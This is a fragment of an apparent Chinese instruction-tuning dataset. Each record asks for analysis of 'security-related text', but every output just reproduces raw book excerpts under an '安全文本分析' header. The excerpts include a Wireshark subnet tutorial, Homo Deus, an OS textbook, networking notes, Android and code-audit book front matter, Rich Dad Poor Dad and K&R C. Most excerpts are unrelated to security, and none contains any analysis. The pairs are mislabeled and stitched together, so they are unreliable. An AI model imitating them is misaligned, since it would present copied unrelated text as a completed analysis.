很多应聘者都会沉思良久他们一定在心里把我骂了很多遍了然后给出下面这些形形色色的答案 答案1A和B不能通信因为如果这样都行的话子网掩码还有什么用这位的反证法听上去很有道理 答案2A和B能通信因为它们可以通过ARP广播获得对方的MAC地址那子网掩码还有什么用楼上的反证法用来反驳这位正好 答案3A和B能通信但所有包都要通过默认网关192.168.26.2转发请问这么复杂的结果你是怎么想到的 答案4A和B不能通信因为ARP不能跨子网这个答案听上去真像是经过认真思考的 以上哪个答案是正确的还是都不正确如果这是你第一次听到这道题不妨停下来思考一下 真相只有一个应聘者的答案却是五花八门可见对网络概念的理解不容含糊否则差之毫厘谬以千里要知道这还只是基本的路由交换知识假如涉及复杂概念结果就更不用说了 问题是即便我们对着教材咬文嚼字也不一定能悟出正确答案这个时候就可以借助Wireshark的抓包与分析功能了我手头就有两台Windows服务器已经按照面试题配好网络如果你以前没有用过Wireshark就开始第一次亲密接触吧 1从http://www.wireshark.org/download.html免费下载安装包并在服务器B上装好把所有可选项都装上 2启动Wireshark软件单击菜单栏上的Capture再单击Interfaces按钮见图2 图2 3服务器B上的所有网卡都会显示在弹出的新窗口上见图3在要抓包的网卡上单击Start按钮 图3 4在服务器B上ping A的IP地址结果是通的见图4该操作产生的网络包已经被Wireshark捕获 图4 5在Wireshark的菜单栏上再次单击Capture然后单击Stop 6在Wireshark的菜单栏上单击File再单击Save把网络包保存到硬盘上这一步并非必需但存档是个好习惯 7收集每台设备的MAC地址以备分析  服务器A: 00:0c:29:0c:22:10  服务器B: 00:0c:29:51:f1:7b  默认网关: 00:50:56:e7:2f:88 现在可以分析网络包了如图5所示Wireshark的界面非常直观最上面是Packet List窗口它列出了所有网络包在Packet List中选定的网络包会详细地显示在中间的Packet Details窗口中由于我在Packet List中选定的是3号包所以图5中看到的就是Frame 3的详情最底下是Packet Bytes Details窗口我们一般不会用到它 图5 接下来看看每个包都做了些什么 1号包见图6 图6 服务器B通过ARP广播查询默认网关192.168.26.2的MAC地址为什么我ping的是服务器A的IPB却去查询默认网关的MAC地址呢这是因为B根据自己的子网掩码计算出A属于不同子网跨子网通信需要默认网关的转发而要和默认网关通信就需要获得其MAC地址 2号包见图7 图7 默认网关192.168.26.2向B回复了自己的MAC地址为什么这些MAC地址的开头明明是00:50:56或者00:0c:29Wireshark上显示出来却都是Vmware这是因为MAC地址的前3个字节表示厂商而00:50:56和00:0c:29都被分配给Vmware公司这是全球统一的标准所以Wireshark干脆显示出厂商名了 3号包见图8 图8 B发出ping包指定Destination IP为A即192.168.26", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n未来简史 从智人到神人 [以色列]尤瓦尔赫拉利 著 林俊宏 译 中信出版社 目录 第1章 人类的新议题 第一部分 智人征服世界 第2章 人类世 第3章 人类的特殊之处 第二部分 智人为世界赋予意义 第4章 说书人 第5章 一对冤家 第6章 与现代的契约 第7章 人文主义革命 第三部分 智人失去控制权 第8章 实验室里的定时炸弹 第9章 大分离 第10章 意识的海洋 第11章 信数据得永生 图片来源 致谢 注释 献给萨蒂亚纳拉扬戈恩卡19242013老师 他春风化雨般教导我许多重要的事 图1 体外受精掌握创造的力量 第1章 人类的新议题 第三个千年开始之际人类醒来伸展手脚揉了揉眼睛脑子里依稀记得某些可怕的噩梦好像有什么铁丝网巨大的蘑菇云之类的但管它的呢只是个噩梦吧人类走进浴室洗洗脸看看镜子里脸上的皱纹然后冲了一杯咖啡打开了记事本来瞧瞧今天有什么重要的事吧 几千年来这个问题的答案并没有什么改变不管是20世纪的中国人中世纪的印度人还是古代的埃及人都面临着同样的三大问题饥荒瘟疫和战争它们永远都是人类的心头大患一代又一代人类向所有神明天使和圣人祈祷膜拜也发明了无数的工具制度和社会系统但仍然有数百万人死于饥饿流行病和暴力许多思想家和先知于是认为饥荒瘟疫和战争一定是上帝整个宇宙计划的一部分抑或是出自人类天生的不完美除非走到时间尽头否则永远不可能摆脱 但在第三个千年开始之际人类开始意识到一件惊人的事虽然多数人很少想到这件事但在过去几十年间我们已经成功遏制了饥荒瘟疫和战争当然这些问题还算不上被完全解决但已经从过去不可理解无法控制的自然力量转化为可应对的挑战我们不再需要祈求某位神或圣人来解救人类而是已经相当了解怎样预防饥荒瘟疫和战争而且通常都能成功 当然有些时候还是会事与愿违但面对这些失败人类不再只是耸耸肩说没办法世界就是这样不完美或是这是上帝的旨意现在如果再有饥荒瘟疫和战争爆发而不受人类控制我们会觉得一定是哪个人出了问题应该成立调查委员会来研究研究而且对自己许下承诺下次一定要做得更好而且这套办法还真行得通此类灾难发生的次数及频率确实都在下降因营养过剩而死亡的人数超过因营养不良而死亡的人数因年老而死亡的人数超过因传染病死亡者自杀身亡的人数甚至超过被士兵恐怖分子和犯罪分子杀害的人数的总和这些都是史无前例的到了21世纪早期平均来说人类死于干旱埃博拉病毒或基地组织恐怖袭击的可能性还不及死于暴饮暴食麦当劳食品的比率 因此虽然各国总统首席执行官和军事将领的每日议题仍然是经济危机和军事冲突但从整个人类历史的宏观角度来说人类已经可以看向别处开始寻找其他议题如果我们确实已经让饥荒瘟疫和战争得到控制什么将取而代之成为人类最重要的议题就像消防员忽然听说再不会有火灾了到了21世纪人类得自问一个前所未有的问题我们接下来要做什么整个世界已经如此健康繁荣又和谐我们该把注意力和创造力投到什么事情上因为生物科技及信息技术为人类带来强大的新力量这个问题也变得倍加迫切手上有了这些力量究竟该如何运用 在回答这个问题之前我们对于饥荒瘟疫和战争还得多谈几句很多人可能会认为说这些问题已经得到控制是个非常离谱天真甚至麻木不仁的说法不是还有几十亿人每天只有不到2美元过日子吗非洲不是还在和艾滋病抗争吗叙利亚和伊拉克不也正有战争肆虐吗要回答这些问题我们得先更仔细地看看21世纪早期的世界至于探索未来几十年的议题且待后续再谈 生物贫穷线 首先谈谈饥荒几千年来这一直是人类最大的敌人甚至在不久前大多数人类仍然生活在生物贫穷线的边缘再低一点就会落入营养不良和饥饿的状态只要发生小失误或是单纯有些运气不好就很有可能把整个家庭或村庄判了死刑如果一场大雨毁了你的麦田或是强盗抢走了你养的羊群你和亲人可能就会饿死如果是整体的不幸或愚蠢行径则会导致大规模的饥荒在古埃及或中世纪印度如果碰到严重干旱这种情况并不少见常常一下子就会有5%或10%的人死去遇上干旱就会出现粮食短缺运输又太过缓慢成本也太高无法进口足够的食物而且政府也无力挽救局面 随便翻开哪本历史书几乎都会读到饥荒的惨状读到人在饥饿之下做出的疯狂行径1694年4月法国博韦Beauvais某地的官员描述了当地饥荒粮价飙涨的影响他说自己的辖地处处都是无数可怜的灵魂饥饿身亡没有工作也就没有钱买面包果腹为求苟延残喘稍解饥饿这些可怜的人以不洁之物为食如死猫或已剥皮而投入粪堆的死马还有人吃宰杀牛流出的血以及厨子扔到街上的动物内脏其他可怜人则吃水煮的荨麻杂草树根药草 1 法国各地都出现了类似的景象由于前两年年景不佳整个王国严重歉收到了1694年春天粮仓已经完全见底有钱人设法囤积粮食以天价出售而穷人则是大批饿死16921694年法国约有280万人饿死约占总人口的15%而与此同时太阳王路易十四仍在凡尔赛宫荒淫无度第二年1695年饥荒袭击爱沙尼亚导致该国人口损失达五分之一1696年则是在", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n操作系统原理 第4版 庞丽萍 编著 华中科技大学出版社 中国武汉 内容简介 操作系统原理自1988年出版以来20余年作者始终紧跟计算机技术的发展始终坚守教学第一线不断地将计算机的新技术与教学改革的新成果融入本书使之日臻完善广受欢迎读者多达18万之众 本书修订全面系统地阐述了现代操作系统的基本原理主要功能及实现技术讨论了现代操作系统的虚拟技术及用户界面重点介绍多用户多任务的运行机制及操作系统资源管理策略和方法以UNIX系统为例介绍了操作系统的实现技术并增加分布式系统内容讨论分布式系统的定义特征模型分布式系统的资源管理及一致性问题 本书既可作为高等院校计算机类本科专科各专业和其他相关专业教材亦可供从事计算机科学工程和应用等方面工作的科技人员参考 再版前言 操作系统原理自1988年出版以来几经修订再版今天呈现给各位读者的是第四版二十多年来在不间断的操作系统原理的教学实践中在操作系统课程的建设中在与同行学者的讨论交流中受益匪浅使我对操作系统的认识和理解不断地深入 学习操作系统都有一个了解理解进一步理解的过程要学懂操作系统需要抓住一个问题运用一种方法搞好一个结合现代操作系统的核心问题是支持多用户多任务的并行执行为此操作系统需要提出新的概念提供解决计算机系统中资源共享协调多个活动之间相互制约关系的方法策略和机制认识操作系统运用的虚拟化的方法将呈现给用户的逻辑视图与操作系统所管理的物理视图区分开来由此产生的资源的虚拟分配虚实之间的映射单CPU上的逻辑并行多任务并发等问题都能更好地理解要学懂操作系统还必须注重操作系统原理与实际的有机结合通过剖析一个现代操作系统实例来印证所学的理论知识通过操作系统实验体会操作系统的功能实现并能锻炼培养系统软件开发能力 本教材针对操作系统内容庞杂涉及面广的特点在内容的选取上注重基础性实质性先进性框架的设计上注重逻辑性完整性力图将操作系统内容组织成一个逻辑清晰的整体在这一整体中始终贯穿着并发共享的主线在这一主线下有一条动态的进程活动轨迹还有一个系统资源管理的剖面针对前者本教材围绕支持多进程运行必需的机制包括数据结构进程控制与进程调度功能及方法展开讨论对后者则针对多用户多任务对系统资源的共享展开操作系统资源管理策略与方法的论述本教材在阐述问题时力求深入浅出通俗易懂使读者便于阅读和理解 此次再版在第三版的基础上作了如下修改 1操作系统实例选用UNIX系统其有关内容和各功能模块安排到相关章节后论述 2增加分布式系统作为第10章内容讨论分布式系统的定义特征模型分布式系统的资源管理及一致性问题 3各章节中适当增加了一些新内容如操作系统的组织结构输入/输出控制等部分 书中所有算法仍用类C的伪码来描述因为这种语言与PDL语言十分相似它含有更多的自然语言这样使读者容易掌握算法的功能 操作系统技术正在不断地发展变革操作系统教材在抓住基础性的同时也需要不断地更新本书还考虑到目前高等学校计算机各专业教学工作的实际需要而修订再版本书用于高等学校计算机本科教学时原则上应讲授第19章的全部内容第10章作为扩展知识的内容可选用其授课时数建议按5560学时安排若用于高校计算机专科教学时应讲授19章的基本内容书中带*号内容可以不讲授其授课时数建议按4550学时安排本书用于高校其他有关专业本科或研究生教学时其讲授内容和学时数可由任课教师根据具体情况确定 我在教学和编写教材过程中学习参考了有关操作系统分布式系统方面的好的教材不断地学习使我加深了对操作系统的理解这些书都给了我很大的帮助在此书再版之际我要感谢指导帮助过我的专家作者老师和我的朋友们和他们的讨论交流使我受益匪浅另外对华中科技大学出版社的领导及有关同志深表谢意因为他们对此书的再版和发行做了大量的工作 此书再版后恳切地希望能继续得到同行和读者们的批评和帮助以便使此书的质量能不断地提高 作 者 2007年12月于武汉 序 操作系统是计算机系统中的核心系统软件它负责控制和管理整个系统资源并协调用户有效地使用这些资源使计算机系统高效地工作操作系统是计算机科学与技术专业的核心课程随着计算机技术的应用越来越广泛其他相关专业也相继把操作系统作为必修课程或选修课程 近年来随着计算机网络多媒体应用以及嵌入式系统的广泛应用操作系统在概念和技术上都有了很快的发展例如网络终端图形用户界面电源管理多处理机操作系统分布式操作系统等操作系统的教材当然也应该及时反映这种发展本书正是作者这种努力的成果它自1988年出版以来经过多次修订及时地反映了操作系统的新技术和新成果这次修订主要增加了分布式系统的内容是作者在分布式计算机系统的教学和科研方面多年积累的结果 现代操作系统是一个十分庞大且复杂的系统操作系统的设计对整个计算机系统的总体功能和性能都有着重要的影响理解操作系统的基本设计原理了解这些原理是如何在真正的操作系统中被实际运用的", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n网络基本功一细说网络传输 网络基本功一细说网络传输 转载请在文首保留原文出处EMC中文支持论坛https://community.emc.com/go/chinese 介绍 常言道欲练神功必先练好基本功之前做了一个关于IP路由默认网关和掩码的问答贴做完这个帖子觉得如果对网络知识点做一个系统的阐述应该会很有帮助 本系列文章着重于讲解网络管理实际应用中常常涉及的重要知识点尽量以实用为主准备写的几个章节暂时有可能会有增减 网络传输 交换机 VLAN与Trunk 路由(上) 路由(下) 链路聚合 IP地址与子网 NAT原理与配置 ICMP与ARP TCP滑动窗口 TCP重传 TCP确认机制 TCP窗口调整与流控 Wireshark抓包实例诊断TCP连接问题 (精) Wireshark抓包实例诊断TCP重传 (精) Wireshark抓包实例诊断TCP重复ACK与乱序 精 Wireshark抓包实例诊断TCP窗口与reset 精 Wireshark抓包实例诊断HTTP问题 精 Wireshark抓包实例诊断数据库问题 HTTP(上) HTTP(下) DNS上 NEW) 细说Linux网络配置上 细说Linux网络配置下 常用诊断工具ping 网络性能监测与实例上 网络性能监测与实例下 tcpdump的妙用 (上) tcpdump的妙用下 更多信息 首先来看一个例子 示例网络服务器向客户端传送数据的过程: 在详细阐述网络传输过程之前先来看一个最常见的例子下图显示了一个网络服务器向客户端传送数据的完整过程 1\\. 需要传送的数据是网络服务器的HTML页面 2\\. 应用协议HTTP报文头添加到HTML数据之前报文头信息包括服务器所使用的HTTP版本以及表明它包含发给网络客户端信息的状态编码 3\\. HTTP应用层协议将HTML格式的网页数据发送给传输层TCP传输层用于管理网络服务器和客户端之间的会话 4\\. IP信息添加到TCP信息之前IP指定适当的源和目的IP地址这些信息就构成了IP报文 5\\. 以太网协议添加到IP报文的两端之后就形成了数据链路帧上述帧发送至通向网络客户端的路径上的最近一个路由器路由器移除以太网信息观察IP报文判定最佳路径将报文插入一个新的帧并发送至目标路径上下一个相邻路由器每一个路由器在转发之前都移除并添加新的数据链路层信息 6\\. 数据通过互联网络传输互联网络包含媒介和中间设备 7\\. 客户端接收到包含数据的数据链路帧处理各层协议头之后以添加时相反的顺序移除协议头首先处理并移除以太网信息之后是IP协议信息接下来TCP信息最后是HTTP信息 8\\. 之后将网页信息传递给客户端网页浏览器软件 数据封装: 消息要在网络中传输必须对它进行编码以特定的格式进行封装同时需要适当地封装以足够的控制和地址信息以使它能够从发送方移动到接收方 消息大小 理论上视频或邮件信息是能够以大块非中断型流从网络源地址传送到目的地址但这也意味着同一时刻同一网络其他设备就无法收发消息这种大型数据流会造成显著延时并且如果传输过程中连接断开整个数据流都会丢失需要全部重传因此更好的方法是将数据流分割segmentation为较小的便于管理的片段能够带来两点好处 发送较小片段网络上同时可有多个会话交错进行这种在网络上将不同会话片段交错进行的过程称为多路传输multiplexing 分割可提高网络通讯的可靠性各消息片段从源地址到目的地址无需经过相同路径如果一条路径被堵塞或断开其余消息可从替换路径到达目的地址如果部分消息到不了目的地址那只需重传丢失部分 通过对片段打上标签的方式来保证顺序以及在接收时重组 协议数据单元Protocol Data Unit, PDU 应用层数据在传输过程中沿着协议栈传递每一层协议都会向其中添加信息这就是封装的过程 数据片段在各层网络结构中采用的形式就称为协议数据单元PDU封装过程中下一层对从上一层收到的PDU进行封装在处理的每一个阶段PDU都有不同的名字来反应它的功能 PDU按照TCP/IP协议的命名规范 数据Data应用层PDU的常用术语 分段Segment传输层PDU 帧Frame网络层PDU 比特Bits在介质上物理传输数据所使用的PDU 封装 封装是指在传输之前为数据添加额外的协议头信息的过程在绝大多数数据通信过程中源数据在传输前都会封装以数层协议在网络上发送消息时主机上的协议栈从上至下进行操作 以网络服务器为例HTTP应用层协议发送HTML格式网页数据到传输层应用层数据被分成TCP分段各TCP分段被打上标签称为头header表明接收方哪一个进程应当接收此消息同时也包含使得接收方能够按照原有的格式来重组数据的信息 传输层将网页HTML数据封装成分段并发送至网络层执行IP层协议整个TCP分段封装成IP报文也就是再添上IP头标签I", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n版权信息 书名Android应用安全防护和逆向分析 作者姜维 排版KK 出版社机械工业出版社 出版时间2017-11-01 ISBN9787111584452   版权所有 侵权必究   对本书的赞誉 移动应用安全已经是个不可忽视的问题本书结合多个案例进行实际操作讲解介绍很多实用工具和命令是一本非常好的安全逆向工具书籍姜维研究安全逆向这么久将自身多年的丰富经验用书本的形式展现给读者也是非常不易我仔细看过这本书感觉真的很不错对学习安全逆向的同学很有帮助值得购买 周鸿祎360公司创始人董事长兼CEO知名天使投资人 本书作者的技术搏客在CSDN上有超过500万人次的总访问量 为什么这么多人会关注Android安全技术因为不仅Android安全技术越来越重要而且要成为真正的开发高手需要从正反两个方面来学习从正面学习Android编程类别API逐层学习App开发从反面逆向研究APK代码学习Android系统如何运行的其他软件是如何实现特定功能的这样获得的Android知识更加系统全面作者在书中有非常详细的案例讲解也提供了大量的工具源码是Android开发人员逆向学习研究的极好工具手册可以帮助Android开发者成为更全面的Android高手 蒋涛CSDN创始人极客帮基金创始人 Android系统应用面越来越广从移动手机到智能硬件都有很高的覆盖率其引发的安全问题危害也越来越大作者以实际操作讲解的同时还特别重视一些原理的介绍可以帮助读者快速提升Android安全技术水平 段钢看雪学院创始人 安全领域是一个冒险的世界作者结合自己在这个领域的丰富经验用生动的案例带领读者在这个世界中探险本书章节安排精心合理技术点循序渐进使用了大量带有标注的配图清晰且直观属于难得一见的用心之作 泮晓波顶象技术移动安全实验室负责人合伙人 本书的作者在信息安全领域的多年经验加上纯粹的技术分享精神注定了这是一本值得广大安全爱好者期待的好书本书完整地向你诠释掌握了安全技术的底层原理你就掌握了安全的一切 丰生强网名非虫国内知名安全专家 随着移动应用的普及移动应用的安全也随之成为一个严肃而重要的问题要解决该问题所需要学习的内容非常多对初学者而言一本合适的入门书籍将起到承前启后的重要作用而本书就恰恰是这样的一本书籍它既涵盖了入门者所必须掌握的基础知识又精选了许多安全领域中的典型实例并对它们开展了详细讲解最后希望作者能再接再厉对本书内容进行持续更新 邓凡平 前言 随着移动应用的广泛使用不可忽视的一个问题就是信息安全本书从Android应用安全和逆向两个方面来介绍移动开发中如何做好安全 我本来不是从事安全逆向工作的但是一个偶然的机会使我发现逆向研究非常有趣因为在逆向出别人的App那一刻会觉得无比自豪 第一次逆向是因为遇到一个问题需要去解决记得当时想查看一个App的内部资源信息尝试使用apktool反编译程序惊奇地发现原来别人的App反编译之后会有这么多东西逆向真的很有趣而后在开发中无法实现或者没有相应的资源时就去反编译别人的App查看对应的代码怎么实现后来就反编译那些有阻碍的应用慢慢摸索克服困难每研究成功一个案例便是对自身技能的一次提高从第一次使用apktool工具到使用Jadx可视化工具再到用IDA工具调试一步一个脚印走过来经验逐渐丰富技能也慢慢提升了 逆向研究需要一种逆向思维我没有接受过专业训练只是在业余时间看相关书籍找几个样本研究从简单到难在这个过程中慢慢学到很多技术本书就是我这几年学习与探索的总结 本书涉及内容有点多但是没有一章是多余的每章内容都是干货本书包括26章分为四篇 基础篇 基础篇包括第17章主要介绍Android技术中与逆向相关的基础知识为后续章节的学习做准备 第1章通过对Android中锁屏密码加密算法的分析带领读者进入安全世界这方面内容不算复杂但是需要阅读Android源码来得到算法分析其中一个知识点是如何通过查看Android源码来帮助解决开发过程中遇到的问题这是所有Android开发人员必备的技能通过找到锁屏密码入口一步一步跟踪最终得到密码加密算法以及加密之后的内容存放在哪里这是进入安全逆向分析世界的大门 第2章主要介绍Android中NDK开发知识为了安全考虑现在很多应用把一部分功能做到了Native层所以如果不知道NDK开发技巧就无法进行后续的逆向操作这一章从搭建环境到每个方法的使用详细讲解了Android中NDK开发的技巧 第3章主要介绍Android中开发以及逆向需要用到的命令每个命令都有特定的案例和用法这些命令不仅仅用于逆向也能够帮助开发人员提升开发效率所以了解和掌握这些命令是至关重要的 第47章主要剖析Android中编译之后的apk包含的四类主要文件格式这部分内容可能有点枯燥但是至关重要因为在安全防护或者逆向分析中都有很重要的意义 防护篇 防", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n图书在版编目CIP数据 富爸爸穷爸爸美清崎美莱希特著萧明译成都四川文艺出版社2013.12 ISBN 978-7-5411-3812-6 Ⅰ①富 Ⅱ①清 ②莱 ③萧 Ⅲ①私人投资通俗读物 Ⅳ①F830.59-49 中国版本图书馆CIP数据核字2013第279272号 FUBABAQIONGBABA 富爸爸穷爸爸 美罗伯特清崎 美莎伦莱希特 著 萧 明 译 责任编辑 张春晓 特邀编辑 聂 敏 张 芹 封面设计 朱 红 版式设计 乐阅文化 出版发行 社 址 成都市槐树街2号 网 址 www.scwys.com 电 话 028-86259285发行部 028-86259303编辑部 传 真 028-86259306 读者服务 028-86259293 邮购地址 成都市槐树街2号四川文艺出版社邮购部 610031 印 刷 三河市中晟雅豪印务有限公司 成品尺寸 152mm215mm 1/32 印 张 7.75 字 数 160千 版 次 2014年1月第一版 印 次 2014年1月第一次印刷 书 号 ISBN 978-7-5411-3812-6 定 价 28.00元 版权所有侵权必究如有质量问题请与出版社联系更换 目录 序言 这就是你所需要的 第一部分 课程 第1章 富爸爸穷爸爸 第2章 第一课 富人不为钱工作 第3章 第二课 为什么要教授财务知识 第4章 第三课 关注自己的事业 第5章 第四课 税收的历史和公司的力量 第6章 第五课 富人的投资 第7章 第六课 学会不为钱工作 第二部分 开端 第8章 克服困难 第三部分 开始行动 第9章 开始行动 第10章 还想要更多吗这里有一些要做的事情 结束语 怎样用7000美元支付孩子的大学费用 序言 这就是你所需要的 学校真的能让孩子们做好应对真实世界的准备吗努力学习取得好成绩你就能找到薪水高福利好的工作我的父母过去经常这么说他们的生活目标就是供我和姐姐上大学认为这样我们才最有可能获得成功1976年当我从佛罗里达州立大学以优异的成绩获得会计专业的学位时我的父母实现了他们的目标这是他们一生中最骄傲的成就根据高等教育总体规划我很快便被八大会计师事务所中的一家雇用了我期待着漫长的职业生涯的开始并希望能够年轻退休 我丈夫迈克尔也走着同样的路我们都来自工作努力的家庭生活朴素并极有职业道德迈克尔也是以优异的成绩毕业的他还先后深造过两次一次是进修工程专业另一次进修法律在这之后他很快便被华盛顿一家著名的律师事务所聘用专攻专利法他的未来看起来非常光明职业的道路差不多也确定了还有充分的退休保障 虽然我们在事业上很成功但一切却并不像我们所期望的那样由于种种原因我们都先后换了几次工作却没有能使我们受益的退休金计划我们的退休基金增长得很慢因为它只能靠我们自己挣 迈克尔和我婚姻美满并养育了3个好孩子在我写下这些话时其中两个正在上大学另一个也已开始念高中了我们花了许多钱以确保孩子们能得到最好的教育 1996年的一天一个孩子从学校回来情绪非常低落他说他已经厌倦了学习为什么我要浪费时间去学那些我一辈子也用不到的东西呢他抗议 我不假思索地答道因为如果你学得不好就进不了大学 我并不在乎上不上大学他说我只想发财 如果你不能大学毕业就找不到好工作我的语气中带着一丝惊慌和关爱如果你找不到好工作又怎么发财呢 儿子笑了带着一点厌烦慢慢地摇了摇头我们以前多次谈过这个话题他低下头转了转眼珠显然我那母亲式的智慧之词在他拒绝倾听的耳朵面前又一次失灵了 虽然儿子很聪明而且也有着强烈的自我意识但他还算是有礼貌有教养 妈妈他开口了现在轮到我听演讲了跟上时代吧你看看周围那些最富有的人并不是因为受了良好的教育才致富的看看迈克尔乔丹和麦当娜吧再看看比尔盖茨他从哈佛退学创立了微软他现在是全美国最富的人而他才30多岁还有一个棒球投手每年能赚400多万美元即使有人认为他智力低下 接下来是长时间的沉默我想该是把我的父母曾给我的忠告告诉儿子的时候了我们周围的世界在改变但那些忠告一直没有变 得到良好的教育和获得优异的成绩不再能确保成功了除了我们的孩子仿佛没有人意识到这一点 妈妈儿子继续说道我不想将来像你和爸爸那样辛苦工作你们是挣了很多钱所以我们住大房子还有很多玩具如果我听从你们的建议将来就会像你们一样更努力地工作却只会缴更多的税和欠更多的债现在根本就没有工作是稳定的我知道现在流行裁员企业规模适度化我也知道今天的大学毕业生比你们刚毕业时挣的少多了再看看医生他们的收入也远不如从前我知道我不能再寄希望于社会保险或公司的退休金了我要寻求新的出路 我想他是对的他需要新的出路我也一样我父母的忠告对1945年以前出生的人来说也许是有用的但对于当今这个迅速变化的时代中的人来说则可能是一场灾难我不能再简单地对我的孩子们说去上学争取拿好成绩然后找一份安稳的工作 我知道我必须找到一条新路来教育孩", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n信息安全技术丛书 代码审计企业级Web代码安全架构 尹毅 著 ISBN978-7-111-52006-1 本书纸版由机械工业出版社于2015年出版电子版由华章分社北京华章图文信息有限公司北京奥维博世图书发行有限公司全球范围内制作与发行 版权所有侵权必究 客服热线+ 86-10-68995265 客服信箱service@bbbvip.com 官方网址www.hzmedia.com.cn 新浪微博 @华章数媒 微信公众号 华章电子书微信号hzebook 目录 序言 前言 导读 第一部分 代码审计前的准备 第1章 代码审计环境搭建 1.1 wamp/wnmp环境搭建 1.2 lamp/lnmp环境搭建 1.3 PHP核心配置详解 第2章 审计辅助与漏洞验证工具 2.1 代码编辑器 2.2 代码审计工具 2.3 漏洞验证辅助 第二部分 漏洞发现与防范 第3章 通用代码审计思路 3.1 敏感函数回溯参数过程 3.2 通读全文代码 3.3 根据功能点定向审计 第4章 漏洞挖掘与防范基础篇 4.1 SQL注入漏洞 4.2 XSS漏洞 4.3 CSRF漏洞 第5章 漏洞挖掘与防范进阶篇 5.1 文件操作漏洞 5.2 代码执行漏洞 5.3 命令执行漏洞 第6章 漏洞挖掘与防范深入篇 6.1 变量覆盖漏洞 6.2 逻辑处理漏洞 6.3 会话认证漏洞 第7章 二次漏洞审计 7.1 什么是二次漏洞 7.2 二次漏洞审计技巧 7.3 dedecms二次注入漏洞分析 第8章 代码审计小技巧 8.1 钻GPC等转义的空子 8.2 神奇的字符串 8.3 php//输入输出流 8.4 PHP代码解析标签 8.5 fuzz漏洞发现 8.6 不严谨的正则表达式 8.7 十余种MySQL报错注入 8.8 Windows FindFirstFile利用 8.9 PHP可变变量 第三部分 PHP安全编程规范 第9章 参数的安全过滤 9.1 第三方过滤函数与类 9.2 内置过滤函数 第10章 使用安全的加密算法 10.1 对称加密 10.2 非对称加密 10.3 单向加密 第11章 业务功能安全设计 11.1 验证码 11.2 用户登录 11.3 用户注册 11.4 密码找回 11.5 资料查看与修改 11.6 投票/积分/抽奖 11.7 充值支付 11.8 私信及反馈 11.9 远程地址访问 11.10 文件管理 11.11 数据库管理 11.12 命令/代码执行 11.13 文件/数据库备份 11.14 API 第12章 应用安全体系建设 12.1 用户密码安全策略 12.2 前后台用户分表 12.3 后台地址隐藏 12.4 密码加密存储方式 12.5 登录限制 12.6 API站库分离 12.7 慎用第三方服务 12.8 严格的权限控制 12.9 敏感操作多因素验证 12.10 应用自身的安全中心 参考资源 序言 我第一次见到尹毅是2013年在北京中关村那时候我正在安全宝创业我们需要招募到最好的人才这时候尹毅的博客吸引了我在一个技术分享逐渐枯竭的时代他的博客令人眼前一亮然后我试图联系到了他并邀请到北京来聊一聊 让我大吃一惊的是尹毅当时还是一个孩子模样但是时不时能从生涩的脸庞里看到成熟在这个年纪就出来工作我想他一定吃过很多苦在之后的工作中尹毅展现出了惊人的天赋交给他的工作总是能迅速并出色地完成并时不时会在工作中有一些创新性成果令人惊喜他的自驱力极强总是不满足于简单的工作于是我不得不想出一些更复杂和艰难的挑战交给他 2014年9月安全宝分拆了部分业务被阿里收购我带着尹毅一起到了阿里此时他已经成为一个安全团队的Leader在中国最大的互联网公司里贡献着力量 尹毅学东西很勤奋他平时的业余时间就是写代码或者看技术文章因此进步迅速他很快就在Web漏洞挖掘能力方面有了长足的进步并取得了不错的成绩他陆续发现了好些开源软件的高危漏洞最难能可贵的是他开始逐步总结这些经验并且沉淀在自己开发的一个漏洞挖掘工具里这让他学会了如何从重复的体力劳动中解放出来把精力用在更有价值的地方这是一个优秀黑客应具有的特质厌倦重复性的体力劳动而对创新充满着无限的热情和旺盛的精力 尹毅认为一个好的黑客必须要懂编程这也是他在这本书里所倡导的理念在他看来不懂编程没挖过漏洞的黑客充其量只能算脚本小子所以尹毅在本书的出发点是从代码审计开始通过代码审计去发现和挖掘漏洞 漏洞挖掘是一门艺术同时也是信息安全的核心领域安全技术发展到今天常见的漏洞挖掘技术有代码审计黑盒测试Fuzzing逆向分析等每一种技术都有独到之处而其中代码审计又是最基本最直接的一种方式是每一个安全专家都应该掌握的技能 但时至今日全自动化的代码审计仍然存在很多困难主要难点在于理解编程语言的语法跨文件之间的关联调用理解开发框架业务逻辑等地方因为这些困难在短期内", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n第1章 导言 在本书的开篇我们首先概要地介绍 C 语言主要是通过实际的程序引入 C 语言的基本 元素至于其中的具体细节规则以及一些例外情况在此暂时不多做讨论因此本章不 准备完整详细地讨论 C 语言中的一些技术(当然这里所举的所有例子都是正确的)我们 是希望读者能尽快地编写出有用的程序为此本章将重点介绍一些基本概念比如变量与 常量算术运算控制流函数基本输入/输出等而对于编写较大型程序所涉及到的一 些重要特性比如指针结构C 语言中十分丰富的运算符集合部分控制流语句以及标准库 等本章将暂不做讨论 这种讲解方式也有缺点应当提请注意的是在本章的内容中无法找到任何特定语言特 性的完整说明并且由于比较简略可能会使读者产生一些误解;再者由于所举的例子 并没有用到 C 语言的所有强大功能因此这些例子也许并不简洁精炼虽然我们已经尽 力将这些问题的影响降到最低但问题肯定还是存在另一个不足之处在于本章所讲的某 些内容在后续相关章节还必须再次讲述我们希望这种重复给读者带来的帮助效果远远超过 它的负面影响 无论是利还是弊一个经验丰富的程序员应该可以从本章介绍的内容中推知他们自己进 行程序设计所需要的一些基本元素初学者应编写一些类似的小程序作为本章内容的补充练 习无论是经验丰富的程序员还是初学者都可以把本章作为后续各章详细讲解的内容的框 1.1 入门 学习一门新程序设计语言的惟一途径就是使用它编写程序对于所有语言的初学者来说 编写的第一个程序几乎都是相同的即: 请打印出下列内容 hello, world 尽管这个练习很简单但对于初学语言的人来说它仍然可能成为一大障碍因为要实 现这个目的我们首先必须编写程序文本然后成功地运行编译并加载运行最后输出 